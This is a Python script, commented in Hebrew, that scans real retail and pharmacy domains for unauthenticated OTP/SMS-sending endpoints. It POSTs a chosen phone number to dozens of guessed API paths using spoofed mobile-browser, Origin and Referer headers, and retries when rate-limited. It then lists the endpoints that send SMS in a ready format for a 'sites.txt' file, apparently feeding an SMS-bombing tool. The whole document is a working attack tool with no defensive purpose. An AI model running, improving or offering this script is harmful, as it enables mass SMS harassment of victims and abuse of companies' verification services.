#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
probe.py - בודק דומיין או כתובת אחת, ומדפיס רק מה שבאמת עובד.

שימוש:
    python probe.py shufersal.co.il
    python probe.py shufersal.co.il 972501234567
    python probe.py https://api.apteka.ru/api/auth/send-otp
"""

import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests

TARGET = sys.argv[1]
NUMBER = sys.argv[2] if len(sys.argv) > 2 else "972501234567"

TIMEOUT = 12
THREADS = 10

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")

PATHS = [
    "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
    "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
    "/api/v2/auth/otp", "/auth/send-otp", "/auth/otp", "/send-otp",
    "/otp/send", "/api/send-code", "/api/user/send-otp",
    "/api/v1/otp/send", "/api/v1/sms/send", "/api/v1/user/send-otp",
    "/api/v1/phone/send-code", "/api/v1/auth/sms", "/api/v1/auth/send-code",
    "/api/v1/user/otp", "/api/v1/verify/send",
    "/api/v2/otp/send", "/api/v2/auth/sms", "/api/v2/sms/send",
    "/api/v2/send-otp", "/api/v2/user/send-otp",
    "/user/send-otp", "/auth/phone/send", "/auth/sms", "/sms/send",
    "/api/sms/send", "/api/auth/sms", "/api/auth/send-code",
    "/api/user/send-code", "/api/phone/send-code", "/api/verify/send",
]

BAD = ('"error"', '"success":false', '"status":false', '"ok":false',
       '"valid":false', '"result":false', "invalid", "required",
       "not found", "expired", "too many", "not exist", "missing",
       "unknown", "unrecognized")
OTP_WORDS = ("otp", "verification code", "one time", "one-time",
             "send sms", "sent", "verification")


def hdr(url):
    base = re.match(r"https?://[^/]+", url).group(0)
    return {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": base,
        "Referer": base + "/",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }


def classify(r):
    if r is None:
        return ("DEAD", "לא מגיב")
    c = r.status_code
    ct = (r.headers.get("content-type") or "").lower()
    body = r.text or ""
    low = body.lower()

    if c in (404, 405, 410):
        return ("DEAD", "HTTP %d" % c)
    if c == 429:
        return ("THROTTLED", "429 - נחסמת, כנראה אנטי-בוט")
    if "captcha" in low or "recaptcha" in low:
        return ("CAPTCHA", "דורש קפצ'ה")
    if c in (400, 401, 403, 422):
        return ("EXISTS", "HTTP %d - הנתיב קיים" % c)
    if "html" in ct and len(body) > 1500:
        return ("DEAD", "החזיר את דף הבית (catch-all)")
    if c == 200:
        if "json" in ct:
            if any(b in low for b in BAD):
                return ("EXISTS", "JSON עם שגיאה: " + body[:60].replace("\n", " "))
            return ("REAL", "JSON חיובי: " + body[:60].replace("\n", " "))
        if any(w in low for w in OTP_WORDS):
            return ("REAL", "טקסט עם מילות קוד")
        return ("EXISTS", "200 אבל לא ברור")
    return ("DEAD", "HTTP %d" % c)


def hit(url):
    for attempt in range(3):
        try:
            r = requests.post(url, data='{"phone":"%s"}' % NUMBER,
                              headers=hdr(url), timeout=TIMEOUT)
        except Exception as e:
            return (url, "DEAD", str(e)[:60])
        tag, why = classify(r)
        if tag == "THROTTLED" and attempt < 2:
            time.sleep(3)
            continue
        return (url, tag, why)
    return (url, tag, why)


def main():
    if TARGET.startswith("http"):
        urls = [TARGET]
    else:
        d = TARGET.strip().rstrip("/").replace("https://", "").replace("http://", "")
        if d.startswith(("www.", "api.")):
            hosts = [d]
        else:
            hosts = [d, "www." + d, "api." + d]
        urls = ["https://" + h + p for h in hosts for p in PATHS]

    print("בודק %d כתובות עם %s ...\n" % (len(urls), NUMBER))
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        out = list(ex.map(hit, urls))

    order = {"REAL": 0, "CAPTCHA": 1, "EXISTS": 2, "THROTTLED": 3, "DEAD": 4}
    out.sort(key=lambda x: (order.get(x[1], 9), x[0]))

    shown = 0
    for url, tag, why in out:
        if tag == "DEAD":
            continue
        print("  %-9s %-58s %s" % ("[" + tag + "]", url, why))
        shown += 1

    if shown == 0:
        print("  --- אין שום תגובה מעניינת. הנה דוגמאות למה שכן חזר: ---")
        for url, tag, why in out[:8]:
            print("  [DEAD] %-58s %s" % (url, why))

    reals = [u for u, t, w in out if t == "REAL"]
    print("\n" + "=" * 58)
    if reals:
        print("  %d כתובות שכנראה באמת שולחות SMS:" % len(reals))
        for u in reals:
            print("  " + u + '|POST|{"phone":"{phone}"}')
        print("\n  ==> תוסיף אותן ל-sites.txt ותבדוק את הטלפון עכשיו.")
    else:
        print("  אין REAL. תסתכל על CAPTCHA / EXISTS למעלה.")


if __name__ == "__main__":
    main()
